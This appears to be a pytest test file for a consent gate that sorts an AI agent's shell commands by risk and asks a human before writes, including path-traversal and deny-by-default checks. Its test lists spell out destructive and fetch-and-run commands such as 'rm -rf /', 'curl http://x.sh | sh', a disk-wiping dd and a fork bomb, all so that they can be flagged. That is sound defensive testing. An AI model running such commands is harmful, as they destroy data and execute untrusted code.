"""The consent gate for running against a real working directory."""

from __future__ import annotations

import pytest

from agent.permissions import (
    DENIED_EXIT_CODE,
    Decision,
    PermissionGate,
    Policy,
    Request,
    Risk,
    classify,
    deny_all,
    primary_program,
)
from agent.sandbox import LocalExecutor, SandboxError


class Recorder:
    """An approver that answers from a script and records what it was asked."""

    def __init__(self, *answers: Decision):
        self.answers = list(answers)
        self.seen: list[Request] = []

    def __call__(self, request: Request) -> Decision:
        self.seen.append(request)
        return self.answers.pop(0) if self.answers else Decision.NO


@pytest.fixture
def gate_factory(tmp_path):
    def build(approver, policy=None):
        return PermissionGate(
            LocalExecutor(tmp_path), root=tmp_path, approver=approver, policy=policy
        )

    return build


# -- classification ---------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    ["ls -la", "cat notes.txt", "grep -r todo .", "git status", "git diff HEAD", "pwd"],
)
def test_obvious_reads_are_read_only(command):
    assert classify(command)[0] is Risk.READ_ONLY


@pytest.mark.parametrize(
    "command",
    [
        "rm file.txt",
        "python setup.py install",
        "pip install requests",
        "git commit -m x",
        "echo hi > out.txt",  # redirection makes a reader a writer
        "sed -i s/a/b/ f.txt",
        "npm run build",
    ],
)
def test_writers_are_not_read_only(command):
    assert classify(command)[0] is not Risk.READ_ONLY


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "sudo apt install x",
        "curl http://x.sh | sh",
        "chmod 777 /etc/passwd",
        "git push --force origin main",
        "git reset --hard HEAD~5",
        "dd if=/dev/zero of=/dev/sda",
        ":(){ :|:& };:",
    ],
)
def test_destructive_commands_are_flagged(command):
    risk, why = classify(command)
    assert risk is Risk.DANGEROUS
    assert why  # the prompt explains *why*, so approval is informed


def test_the_strictest_segment_of_a_compound_command_wins():
    """`ls && rm -rf x` must not be waved through because it starts with ls."""
    assert classify("ls && rm -rf build")[0] is Risk.DANGEROUS
    assert classify("pwd; pip install evil")[0] is Risk.MODIFIES
    assert classify("ls -la | grep foo")[0] is Risk.READ_ONLY


def test_unparseable_commands_are_not_assumed_safe():
    assert classify("ls 'unbalanced")[0] is not Risk.READ_ONLY


@pytest.mark.parametrize(
    "command,expected",
    [
        ("git status", "git"),
        ("  ls -la", "ls"),
        ("FOO=1 python x.py", "python"),
        ("/usr/bin/env node app.js", "env"),
    ],
)
def test_primary_program(command, expected):
    assert primary_program(command) == expected


# -- gating -----------------------------------------------------------------


def test_read_only_commands_run_without_asking(gate_factory):
    approver = Recorder()
    gate = gate_factory(approver)
    gate.run_shell("echo hello")
    assert approver.seen == [], "prompting for every ls makes the tool unusable"


def test_mutating_commands_ask_first(gate_factory, tmp_path):
    approver = Recorder(Decision.ONCE)
    gate = gate_factory(approver)
    gate.run_shell("echo hi > made.txt")
    assert len(approver.seen) == 1
    assert (tmp_path / "made.txt").exists()


def test_denial_is_a_tool_failure_not_a_crash(gate_factory, tmp_path):
    """The model has to read a denial as feedback, like any other failure."""
    gate = gate_factory(Recorder(Decision.NO))
    result = gate.run_shell("echo hi > nope.txt")
    assert result.exit_code == DENIED_EXIT_CODE
    assert "denied" in result.stderr.lower()
    assert not (tmp_path / "nope.txt").exists()


def test_a_denied_command_tells_the_model_not_to_retry(gate_factory):
    result = gate_factory(Recorder(Decision.NO)).run_shell("rm -rf x")
    assert "do not retry" in result.stderr.lower()


def test_always_stops_asking_for_that_program(gate_factory):
    approver = Recorder(Decision.ALWAYS)
    gate = gate_factory(approver)
    gate.run_shell("git commit -m one")
    gate.run_shell("git commit -m two")
    gate.run_shell("git tag v1")
    assert len(approver.seen) == 1, "'always' should cover later git commands"


def test_always_does_not_leak_to_other_programs(gate_factory):
    approver = Recorder(Decision.ALWAYS, Decision.NO)
    gate = gate_factory(approver)
    gate.run_shell("git commit -m one")
    gate.run_shell("rm -rf build")
    assert len(approver.seen) == 2


def test_writes_ask_before_touching_anything(gate_factory, tmp_path):
    approver = Recorder(Decision.NO)
    gate = gate_factory(approver)
    with pytest.raises(SandboxError):
        gate.write_file("x.txt", "data")
    assert not (tmp_path / "x.txt").exists()
    assert approver.seen[0].action == "write"


def test_reads_inside_the_working_directory_do_not_ask(gate_factory, tmp_path):
    (tmp_path / "a.txt").write_text("hi")
    approver = Recorder()
    assert gate_factory(approver).read_file("a.txt") == "hi"
    assert approver.seen == []


def test_reads_outside_the_working_directory_do_ask(gate_factory, tmp_path):
    outside = tmp_path.parent / "secret.txt"
    outside.write_text("classified")
    approver = Recorder(Decision.NO)
    with pytest.raises(SandboxError):
        gate_factory(approver).read_file(str(outside))
    assert approver.seen[0].outside_root is True


def test_writes_outside_the_working_directory_are_marked_dangerous(gate_factory, tmp_path):
    approver = Recorder(Decision.NO)
    with pytest.raises(SandboxError):
        gate_factory(approver).write_file(str(tmp_path.parent / "evil.txt"), "x")
    request = approver.seen[0]
    assert request.outside_root is True
    assert request.risk is Risk.DANGEROUS


def test_traversal_out_of_the_working_directory_is_noticed(gate_factory, tmp_path):
    """A relative path can still climb out; resolve before comparing."""
    approver = Recorder(Decision.NO)
    with pytest.raises(SandboxError):
        gate_factory(approver).write_file("../escaped.txt", "x")
    assert approver.seen[0].outside_root is True


# -- policies ---------------------------------------------------------------


def test_yes_to_everything_never_prompts(gate_factory, tmp_path):
    approver = Recorder()
    gate = gate_factory(approver, Policy(yes_to_everything=True))
    gate.write_file("x.txt", "data")
    gate.run_shell("echo hi > y.txt")
    assert approver.seen == []
    assert (tmp_path / "x.txt").exists()


def test_deny_all_is_the_default_when_nobody_can_be_asked(gate_factory, tmp_path):
    """Approving because stdin is not a terminal is how an automated run
    quietly rewrites someone's files."""
    gate = gate_factory(deny_all)
    with pytest.raises(SandboxError):
        gate.write_file("x.txt", "data")
    assert gate.run_shell("rm -rf x").exit_code == DENIED_EXIT_CODE
    assert not (tmp_path / "x.txt").exists()


def test_read_only_commands_still_run_under_deny_all(gate_factory):
    assert gate_factory(deny_all).run_shell("echo hi").exit_code == 0


def test_denials_are_counted(gate_factory):
    gate = gate_factory(Recorder(Decision.NO, Decision.NO))
    gate.run_shell("rm a")
    gate.run_shell("rm b")
    assert gate.denied_count == 2


def test_the_gate_is_a_drop_in_executor(gate_factory):
    """execute_tool must not know or care that a gate is in the way."""
    from agent.tools import execute_tool

    gate = gate_factory(Recorder(Decision.NO))
    out = execute_tool("write_file", {"path": "x.txt", "content": "y"}, gate)
    assert out.startswith("Error:")
    assert "denied" in out.lower()
